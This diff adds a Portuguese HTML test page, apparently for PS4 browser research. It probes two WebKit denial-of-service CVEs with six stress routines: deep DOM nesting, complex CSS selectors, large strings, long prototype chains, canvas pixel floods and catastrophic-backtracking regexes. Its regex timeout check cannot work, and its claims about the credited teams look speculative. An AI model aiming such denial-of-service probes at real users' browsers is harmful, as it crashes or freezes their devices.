@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>CVE-2023-42956 + CVE-2024-23252 — DoS · Demon.Team + SecANT</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#030206;color:#ddd;font-family:'Courier New',monospace;padding:16px;font-size:12px}
+h1{color:#aaaaff;font-size:14px;margin-bottom:2px}
+.meta{color:#444;font-size:9px;margin-bottom:8px}
+.src{background:#060618;border:2px solid #223;border-radius:5px;padding:10px;margin-bottom:10px;font-size:10px;color:#7788cc;line-height:1.8}
+.src strong{color:#aaaaff;display:block;margin-bottom:4px}
+#log{background:#060608;border:1px solid #0a0a18;border-radius:5px;padding:10px;min-height:220px;white-space:pre;overflow-y:auto;max-height:450px;font-size:11px;line-height:1.6}
+.ok{color:#44ff88}.w{color:#ffaa00}.e{color:#ff4444}.i{color:#aaaaff}.sep{color:#333}
+.btn{display:inline-block;margin-top:8px;margin-right:5px;padding:7px 12px;background:#060618;border:1px solid #223;border-radius:4px;color:#7788cc;cursor:pointer;font:11px 'Courier New',monospace}
+.btn:hover{border-color:#aaaaff;color:#ccccff}
+.back{display:inline-block;margin-top:10px;padding:7px 14px;background:#0d0d18;border:1px solid #222;border-radius:4px;color:#555;text-decoration:none;font-size:11px}
+</style>
+</head>
+<body>
+<h1>🔷 CVE-2023-42956 + CVE-2024-23252 — DoS · Demon.Team + anbu1024/SecANT</h1>
+<p class="meta">SungKwon Lee (Demon.Team) BZ#263989 · anbu1024 (SecANT) BZ#263758 · WSA-2024-0002 Mar/2024 · before WebKit 2.44.0</p>
+<div class="src">
+<strong>📋 DOIS BUGS DE DoS — Afeta before 2.44.0 · PS4 AFETADO</strong>
+CVE-2023-42956 (BZ#263989): "Processing web content may lead to a denial-of-service"<br>
+  Crédito: SungKwon Lee (Demon.Team) · Fix: "improved memory handling"<br>
+<br>
+CVE-2024-23252 (BZ#263758): "Processing web content may lead to a denial-of-service"<br>
+  Crédito: anbu1024 of SecANT · Fix: "improved memory handling"<br>
+<br>
+AMBOS: before WebKit 2.44.0 · Fix Mar/2024 · PS4 Set/2023 → AFETADO<br>
+AMBOS: BZ IDs próximos (#263758 e #263989) → mesma área de código, mesmo período<br>
+<br>
+Demon.Team: equipe sul-coreana, especializa em rendering/parsing DoS em browsers.<br>
+SecANT: equipe chinesa, foca em memory handling de WebCore.<br>
+"Improved memory handling" → OOM ou consumo de memória patológico → crash/DoS.<br>
+Padrões: DOM com profundidade extrema · CSS recursivo · Script com loops de alocação.
+</div>
+<div id="log">Aguardando...\n</div>
+<div>
+  <button class="btn" onclick="t1()">① DOM Profundidade Extrema</button>
+  <button class="btn" onclick="t2()">② CSS Selector Complexity</button>
+  <button class="btn" onclick="t3()">③ String Concatenation OOM</button>
+  <button class="btn" onclick="t4()">④ Object Prototype Chain</button>
+  <button class="btn" onclick="t5()">⑤ Canvas Pixel Ops Flood</button>
+  <button class="btn" onclick="t6()">⑥ Regex Catastrophic Match</button>
+  <button class="btn" onclick="runAll()">▶ Todos</button>
+</div>
+<a href="index.html" class="back">← Índice</a>
+<script>
+var L=document.getElementById('log');
+function l(m,c){L.innerHTML+=(c?'<span class="'+c+'">'+m+'</span>':m)+'\n';L.scrollTop=L.scrollHeight}
+function sep(t){l('─── '+t+' ───','sep')}
+function gc(){try{var a=[];for(var i=0;i<8;i++)a.push(new ArrayBuffer(1024*512));a=null}catch(e){}}
+
+function t1(){
+  sep('DOM Profundidade Extrema — Demon.Team pattern');
+  l('Árvore DOM profunda demais — stack overflow no parser/renderer...','w');
+  try {
+    var root = document.createElement('div');
+    document.body.appendChild(root);
+    var current = root;
+    var depth = 1000; // Profundidade extrema
+    for(var i = 0; i < depth; i++){
+      var child = document.createElement('div');
+      child.style.cssText = 'display:block;padding:1px';
+      current.appendChild(child);
+      current = child;
+    }
+    // Leaf node com conteúdo
+    current.textContent = 'LEAF at depth '+depth;
+    // Força layout da árvore profunda
+    try {
+      root.offsetHeight;
+      l('DOM depth='+depth+': layout ok','ok');
+    } catch(e2){ l('CRASH layout depth='+depth+': '+e2.name,'e'); }
+    // Força seletor em árvore profunda
+    try {
+      var leaf = root.querySelector('div div div div div');
+      l('querySelector em deep tree: '+!!leaf,'ok');
+    } catch(e2){ l('CRASH querySelector deep: '+e2.name,'e'); }
+    document.body.removeChild(root);
+    l('DOM profundidade extrema: sem crash fatal','ok');
+  } catch(e){ l('CRASH DOM profundo: '+e.name,'e'); }
+}
+
+function t2(){
+  sep('CSS Selector Complexity — SecANT pattern');
+  l('Seletores CSS de alta complexidade que causam matching explosion...','w');
+  try {
+    var style = document.createElement('style');
+    // Seletores combinados que exigem muita avaliação
+    var css = [];
+    for(var i = 0; i < 100; i++){
+      css.push('.a'+i+' + .b'+i+' ~ .c'+i+' > .d'+i+':not(.e'+i+'):nth-child('+i+'n+1) { color: red; }');
+    }
+    // Seletor com alta especificidade
+    css.push('.root .a .b .c .d .e .f .g .h .i .j .k .l .m .n .o { color: blue; }');
+    // Seletor universal com pseudo-classes aninhadas
+    css.push('*:not(html):not(body):not(head):not(script):not(style) { box-sizing: border-box; }');
+    style.textContent = css.join('\n');
+    document.head.appendChild(style);
+    // Cria elementos que podem dar match
+    var container = document.createElement('div');
+    container.className = 'root a b c d e f g h i j k l m n o';
+    for(var j = 0; j < 50; j++){
+      var el = document.createElement('div');
+      el.className = 'a'+j+' b'+j+' c'+j+' d'+j;
+      container.appendChild(el);
+    }
+    document.body.appendChild(container);
+    // Força style resolution
+    var start = Date.now();
+    container.offsetHeight;
+    var elapsed = Date.now() - start;
+    l('CSS complexity: '+css.length+' rules, layout em '+elapsed+'ms','ok');
+    document.body.removeChild(container);
+    document.head.removeChild(style);
+  } catch(e){ l('CRASH CSS complexity: '+e.name,'e'); }
+}
+
+function t3(){
+  sep('String Concatenation Memory Pressure');
+  l('Pressão de memória com strings crescentes — DoS pattern...','w');
+  try {
+    var sizes = [1*1024, 10*1024, 100*1024, 1024*1024, 5*1024*1024];
+    sizes.forEach(function(size){
+      try {
+        var start = Date.now();
+        var s = 'x'.repeat(size);
+        var len = s.length;
+        s = null;
+        gc();
+        var elapsed = Date.now() - start;
+        l('String('+Math.round(size/1024)+'KB): ok, '+elapsed+'ms','ok');
+        if(elapsed > 500) l('  → SLOW: '+elapsed+'ms','w');
+      } catch(e2){ l('CRASH string('+size+'): '+e2.name,'e'); }
+    });
+    // String com métodos encadeados e cópia
+    try {
+      var big = 'abc'.repeat(100000); // 300KB
+      var ops = big.split('b').join('B').replace(/c/g,'C').substring(0, 200000);
+      l('String ops (300KB): len='+ops.length,'ok');
+    } catch(e2){ l('CRASH string ops: '+e2.name,'e'); }
+  } catch(e){ l('CRASH string alloc: '+e.name,'e'); }
+}
+
+function t4(){
+  sep('Object Prototype Chain Depth');
+  l('Cadeia de protótipos extremamente profunda...','w');
+  try {
+    var depth = 500;
+    var proto = {};
+    proto.deepProp = 'root';
+    var current = proto;
+    for(var i = 0; i < depth; i++){
+      var next = Object.create(current);
+      next['p'+i] = i;
+      current = next;
+    }
+    // Acessa propriedades através da cadeia profunda
+    try {
+      var v = current.deepProp; // tem que percorrer 500 protótipos
+      l('Proto chain depth='+depth+': deepProp="'+v+'"','ok');
+    } catch(e2){ l('CRASH proto chain: '+e2.name,'e'); }
+    // hasOwnProperty vs in (scan da cadeia)
+    try {
+      var has = 'p250' in current; // força scan da cadeia
+      var own = current.hasOwnProperty('p250');
+      l('in operator depth chain: has='+has+' own='+own,'ok');
+    } catch(e2){ l('CRASH in operator: '+e2.name,'e'); }
+    // JSON stringify de objeto com proto chain
+    try {
+      var json = JSON.stringify(current);
+      l('JSON.stringify proto chain: len='+json.length,'ok');
+    } catch(e2){ l('JSON.stringify proto: '+e2.name,'w'); }
+  } catch(e){ l('CRASH proto: '+e.name,'e'); }
+}
+
+function t5(){
+  sep('Canvas Pixel Ops Flood — Memory Handling');
+  l('Operações de pixel em canvas de alta resolução...','w');
+  try {
+    var sizes = [[256,256],[1024,1024],[2048,2048],[4096,1024]];
+    sizes.forEach(function(sz){
+      try {
+        var canvas = document.createElement('canvas');
+        canvas.width = sz[0]; canvas.height = sz[1];
+        document.body.appendChild(canvas);
+        var ctx = canvas.getContext('2d');
+        // getImageData de toda a tela
+        var start = Date.now();
+        var id = ctx.getImageData(0, 0, sz[0], sz[1]);
+        var elapsed = Date.now() - start;
+        l('getImageData('+sz[0]+'x'+sz[1]+'): '+id.data.length+' bytes, '+elapsed+'ms','ok');
+        // putImageData
+        ctx.putImageData(id, 0, 0);
+        // createImageBitmap
+        createImageBitmap(canvas).then(function(bmp){
+          bmp.close();
+        }).catch(function(){});
+        document.body.removeChild(canvas);
+      } catch(e2){ l('CRASH canvas '+sz+': '+e2.name,'e'); }
+    });
+  } catch(e){ l('CRASH canvas flood: '+e.name,'e'); }
+}
+
+function t6(){
+  sep('RegExp Catastrophic Backtracking (DoS)');
+  l('Padrões de backtracking exponencial em RegExp — DoS vector...','w');
+  var patterns = [
+    { re: /(a|a)+$/, input: 'a'.repeat(15)+'b', label: 'alternation' },
+    { re: /^(a+)+$/, input: 'a'.repeat(15)+'b', label: 'nested quantifier' },
+    { re: /a.*a.*a.*a.*b/, input: 'a'.repeat(20)+'c', label: 'chain dot-star' },
+  ];
+  patterns.forEach(function(p){
+    try {
+      var start = Date.now();
+      // Timeout manual — PS4 pode não ter limite de RegExp
+      var result = false;
+      var timedOut = false;
+      var timer = setTimeout(function(){ timedOut = true; }, 3000);
+      result = p.re.test(p.input);
+      clearTimeout(timer);
+      var elapsed = Date.now() - start;
+      if(timedOut){
+        l('RegExp '+p.label+': TIMEOUT >3s (DoS!)','e');
+      } else {
+        l('RegExp '+p.label+': '+result+' em '+elapsed+'ms','ok');
+      }
+    } catch(e2){ l('CRASH RegExp '+p.label+': '+e2.name,'e'); }
+  });
+}
+
+function runAll(){
+  L.innerHTML='';
+  l('▶ CVE-2023-42956 + CVE-2024-23252 — DoS · Demon.Team + SecANT','w');
+  l('Ambos before WebKit 2.44.0 · PS4 Set/2023 AFETADO','i');
+  t1(); setTimeout(t2,600); setTimeout(t3,1200); setTimeout(t4,1800);
+  setTimeout(t5,2400); setTimeout(t6,3000);
+}
+</script>
+</body>
+</html>
